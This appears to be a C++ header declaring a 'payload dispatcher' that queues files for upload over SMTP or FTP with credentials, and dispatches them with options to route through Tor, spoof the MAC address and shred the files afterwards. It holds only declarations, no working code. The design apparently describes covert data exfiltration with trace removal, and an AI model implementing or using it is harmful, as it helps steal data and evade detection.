#ifndef PAYLOAD_DISPATCHER_H
#define PAYLOAD_DISPATCHER_H

#include <string>
#include <vector>

namespace PayloadDispatcher {

    struct PayloadJob {
        std::string method;        // "smtp" or "ftp"
        std::string filePath;
        std::string remoteName;
        std::string target;
        std::string user;
        std::string password;
    };

    void queue_payload(const PayloadJob& job);
    void dispatch_all(bool useTor, bool spoofMac, bool shredAfter);
}

#endif // PAYLOAD_DISPATCHER_H
